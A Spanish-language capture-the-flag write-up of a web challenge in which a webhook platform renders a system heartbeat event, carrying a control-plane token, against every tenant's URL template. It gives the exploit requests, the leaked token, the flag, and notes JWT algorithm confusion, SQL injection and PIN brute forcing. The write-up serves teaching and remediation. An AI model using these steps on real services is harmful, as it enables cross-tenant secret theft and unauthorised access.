# Write-up — Crosstalk (HookRelay)

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | web |
| **Dificultad** | Hard |
| **Puntos** | 345 |
| **Flag** | `flag{2f8d33a3e5875541}` |
| **Vulnerabilidad** | Fuga de secreto cross-tenant: un evento del sistema con el token del control plane se renderiza contra la plantilla de cada suscripción |

---

## 1. Enunciado

> HookRelay routes your webhook events to whichever endpoints you've subscribed. You
> get a regular user account on a shared tenant; **the compliance auditors keep a flag
> somewhere on the control plane.**

Se entrega el código fuente (Flask + GraphQL/ariadne + JWT). Objetivo: llegar al
**control plane** siendo un usuario normal de un tenant compartido.

---

## 2. El objetivo: el control plane

`control.py` sirve la flag, pero no con JWT — con un token secreto de proceso:

```python
@bp.route("/api/v2/admin/control")
def admin_control():
    token = request.headers.get("X-Heartbeat-Token", "")
    if not hmac.compare_digest(token, HEARTBEAT_TOKEN):
        return {"error": "Invalid heartbeat token"}, 403
    return {"flag": FLAG, ...}
```

`HEARTBEAT_TOKEN = secrets.token_hex(24)` (config.py) — 48 hex aleatorios por proceso.
Hay que **filtrarlo**.

---

## 3. Dónde se filtra: el broadcast del heartbeat (crosstalk)

`events.py` corre un loop que cada 60s emite un evento que **contiene el token**:

```python
event = {
    "type": "system.heartbeat",
    "actor": {"role": "system",
              "context": {"continuation_id": HEARTBEAT_TOKEN}},  # <-- el secreto
    ...
}
record_system_broadcast(event)
```

Y `audit.py::record_system_broadcast` — pensado para que "todo tenant pueda auditar los
health beacons" — recorre **TODAS las suscripciones de TODOS los tenants** y, para cada
una, **renderiza su `url_template` contra el evento** y guarda el resultado en el audit
del dueño:

```python
def record_system_broadcast(event):
    for sub in iter_subscriptions():          # todas, de todos los tenants
        rendered = render(sub["url_template"], event)   # plantilla vs. evento con el token
        _append({... "owner": sub["owner"], "rendered_url": rendered, ...})
```

`templating.py` resuelve `{{path.to.field}}` recorriendo el dict del evento:

```python
_TOKEN = re.compile(r"\{\{\s*([A-Za-z0-9_.]+)\s*\}\}")   # {{a.b.c}}
```

**El "crosstalk":** el evento del sistema con el token secreto se pasa por el motor de
plantillas de **nuestra** suscripción. Si nuestra plantilla referencia
`actor.context.continuation_id`, el token acaba en **nuestro** audit log.

---

## 4. Explotación

```
1. POST /api/auth/register {"username":"..."}           -> JWT (role user)
2. POST /api/v2/subscriptions  (Bearer JWT)
      {"name":"leak",
       "url_template":"https://x.test/{{actor.context.continuation_id}}",
       "filter":"user.*"}                                 (el filtro da igual: el
                                                           broadcast ignora el filtro)
3. esperar el heartbeat (<=60s) y leer el propio audit:
   GET /api/v2/audit/dispatches (Bearer JWT)
      -> entry event_type "system.heartbeat",
         rendered_url = "https://x.test/<HEARTBEAT_TOKEN>"
4. GET /api/v2/admin/control  con header  X-Heartbeat-Token: <HEARTBEAT_TOKEN>
      -> {"flag": "..."}
```

Ejecución real:

```
[+] HEARTBEAT_TOKEN: adc92ede16cb04a7ffbf79537a5bb0517332fb4b1e546d1f
[+] control: 200 {"endpoint":"control_plane","flag":"flag{2f8d33a3e5875541}","version":"v2"}
```

(`url_template` debe empezar por `https://` — el prefijo satisface la validación y el
token va en el path.) Script en `exploit.py`.

---

## 5. Flag

```
flag{2f8d33a3e5875541}
```

---

## 6. Otros bugs presentes (no necesarios para la flag)

- **Confusión de algoritmo JWT (RS256/HS256)** en `jwt_verify.py`: para HS256 usa la
  **clave pública** como secreto HMAC, y la pública se expone en `/api/public-key`.
  Permite forjar cualquier token (p. ej. `role: superadmin`, `sub: admin`).
- **SQLi** por f-string en `/api/v1/legacy/search` (`WHERE name LIKE '%{q}%'`).
- **Brute-force del PIN** del GraphQL `verifyPin` (PIN 1000–9999, rate-limit 3/min).

---

## 7. Causa raíz y remediación

**Causa raíz:** mezclar datos sensibles del plano de control con datos que se procesan
en el plano de datos de los tenants. El `HEARTBEAT_TOKEN` viaja dentro de un evento que
se entrega/renderiza con plantillas controladas por usuarios de otros tenants — un
motor de plantillas con acceso completo al contexto del evento es un canal de fuga.

**Cómo se arregla:**

- **No poner secretos en los eventos.** El token de autenticación interno jamás debe
  formar parte de un payload que toque el plano de datos ni el motor de plantillas.
- **Aislar por tenant** el contexto que ve cada plantilla: exponer solo campos
  whitelisted y públicos del evento, nunca `actor.context.*` interno.
- **No renderizar plantillas ajenas contra eventos del sistema.** El "audit surface"
  debería registrar un placeholder, no ejecutar el template de cada suscripción contra
  el evento real.
- Separar credenciales de plano de control con rotación y scope, no un token de proceso
  compartido.

**Lección de CTF (web):** en plataformas multi-tenant con webhooks/plantillas, busca
dónde un dato del sistema (health beacons, eventos internos) se cruza con plantillas o
callbacks controlados por el usuario. Un `{{...}}` con acceso al contexto completo del
evento suele ser un SSTI de exfiltración.
